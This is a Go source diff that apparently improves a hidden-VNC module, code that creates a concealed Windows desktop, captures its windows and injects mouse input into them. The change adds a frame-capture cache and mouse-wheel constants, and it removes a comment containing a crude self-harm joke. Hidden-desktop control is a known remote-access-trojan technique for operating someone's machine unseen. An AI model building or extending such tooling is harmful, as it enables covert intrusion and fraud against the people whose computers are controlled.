@@ -81,6 +81,8 @@ const (
 	MOUSEEVENTF_RIGHTUP    = 0x0010
 	MOUSEEVENTF_MIDDLEDOWN = 0x0020
 	MOUSEEVENTF_MIDDLEUP   = 0x0040
+	MOUSEEVENTF_WHEEL      = 0x0800
+	MOUSEEVENTF_ABSOLUTE   = 0x8000
 	INPUT_MOUSE            = 0
 	INPUT_KEYBOARD         = 1
 	KEYEVENTF_KEYUP        = 0x0002
@@ -167,6 +169,10 @@ var (
 	hvncCurrentTaskID   atomic.Uint64
 	hvncCurrentTaskKind atomic.Int64
 	hvncCurrentTaskNs   atomic.Int64
+
+	// Capture cache: pooled DC/DIB per window to avoid per-frame allocation
+	hvncWinCache     map[uintptr]*hvncWinCacheEntry
+	hvncWinCachePrev []byte // previous composite frame for dirty detection
 )
 
 type hvncTaskKind int
@@ -240,6 +246,15 @@ type mouseInput struct {
 	dwFlags     uint32
 	time        uint32
 	dwExtraInfo uintptr
+}
+
+type hvncWinCacheEntry struct {
+	hdcMem uintptr
+	hbmp   uintptr
+	bits   unsafe.Pointer
+	w, h   int
+	lastOK bool
+	age    int
 }
 
 type keybdInput struct {
@@ -331,6 +346,12 @@ func InitializeHVNCDesktop() error {
 func CleanupHVNCDesktop() {
 	hvncDesktopMu.Lock()
 	defer hvncDesktopMu.Unlock()
+
+	for _, entry := range hvncWinCache {
+		hvncFreeCacheEntry(entry)
+	}
+	hvncWinCache = nil
+	hvncWinCachePrev = nil
 
 	if hvncDesktopHandle != 0 {
 		if hvncOriginalDesktop != 0 {
@@ -1165,8 +1186,6 @@ func hvncMouseWheelOnThread(delta int32) error {
 			return nil
 		}
 	}
-	// WM_MOUSEWHEEL: wparam high word = delta, low word = button/key state
-	// WM_MOUSEWHEEL: lparam = screen coordinates (NOT client coordinates) (I wanna fucking kms)
 	wparam := (uintptr(uint16(delta)) << 16) | uintptr(currentMouseButtons())
 	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(pt.x, pt.y))
 	return nil
@@ -1279,14 +1298,83 @@ func drawHVNCWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target [
 		return 0
 	}
 
+	// Initialize cache if needed
+	if hvncWinCache == nil {
+		hvncWinCache = make(map[uintptr]*hvncWinCacheEntry)
+	}
+
+	// Track which windows are still alive this frame
+	alive := make(map[uintptr]bool)
+
 	drawn := 0
 	for hwnd != 0 {
 		if drawHVNCWindow(hdcScreen, hwnd, bounds, target, targetStride) {
 			drawn++
 		}
+		alive[hwnd] = true
 		hwnd = getWindow(hwnd, GW_HWNDPREV)
 	}
+
+	// Evict cache entries for windows that no longer exist
+	for h, entry := range hvncWinCache {
+		if !alive[h] {
+			hvncFreeCacheEntry(entry)
+			delete(hvncWinCache, h)
+		}
+	}
+
 	return drawn
+}
+
+func hvncGetOrCreateCache(hdcScreen uintptr, hwnd uintptr, w, h int) *hvncWinCacheEntry {
+	entry, ok := hvncWinCache[hwnd]
+	if ok && entry.w == w && entry.h == h && entry.hdcMem != 0 && entry.hbmp != 0 {
+		entry.age = 0
+		return entry
+	}
+	if ok {
+		hvncFreeCacheEntry(entry)
+	}
+	hdcMem := createCompatibleDC(hdcScreen)
+	if hdcMem == 0 {
+		return nil
+	}
+	bmi := bitmapInfo{
+		bmiHeader: bitmapInfoHeader{
+			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
+			biWidth:       int32(w),
+			biHeight:      -int32(h),
+			biPlanes:      1,
+			biBitCount:    32,
+			biCompression: BI_RGB,
+		},
+	}
+	var bits unsafe.Pointer
+	hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
+	if hbmp == 0 || bits == nil {
+		deleteDC(hdcMem)
+		return nil
+	}
+	selectObject(hdcMem, hbmp)
+
+	entry = &hvncWinCacheEntry{
+		hdcMem: hdcMem,
+		hbmp:   hbmp,
+		bits:   bits,
+		w:      w,
+		h:      h,
+	}
+	hvncWinCache[hwnd] = entry
+	return entry
+}
+
+func hvncFreeCacheEntry(entry *hvncWinCacheEntry) {
+	if entry.hbmp != 0 {
+		deleteObject(entry.hbmp)
+	}
+	if entry.hdcMem != 0 {
+		deleteDC(entry.hdcMem)
+	}
 }
 
 func drawHVNCWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
@@ -1315,35 +1403,20 @@ func drawHVNCWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []by
 		return false
 	}
 
-	hdcMem := createCompatibleDC(hdcScreen)
-	if hdcMem == 0 {
-		return false
-	}
-	defer deleteDC(hdcMem)
-
-	bmi := bitmapInfo{
-		bmiHeader: bitmapInfoHeader{
-			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
-			biWidth:       int32(winW),
-			biHeight:      -int32(winH),
-			biPlanes:      1,
-			biBitCount:    32,
-			biCompression: BI_RGB,
-		},
-	}
-	var bits unsafe.Pointer
-	hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
-	if hbmp == 0 || bits == nil {
-		return false
-	}
-	selectObject(hdcMem, hbmp)
-	defer deleteObject(hbmp)
-
-	if !printWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT) {
+	// Use pooled DC+DIB from cache
+	entry := hvncGetOrCreateCache(hdcScreen, hwnd, winW, winH)
+	if entry == nil {
 		return false
 	}
 
-	buf := unsafe.Slice((*byte)(bits), winW*winH*4)
+	if !printWindow(hwnd, entry.hdcMem, PW_RENDERFULLCONTENT) {
+		entry.lastOK = false
+		entry.age++
+		return false
+	}
+	entry.lastOK = true
+
+	buf := unsafe.Slice((*byte)(entry.bits), winW*winH*4)
 	winStride := winW * 4
 
 	interLeft := maxInt(winLeft, bounds.Min.X)
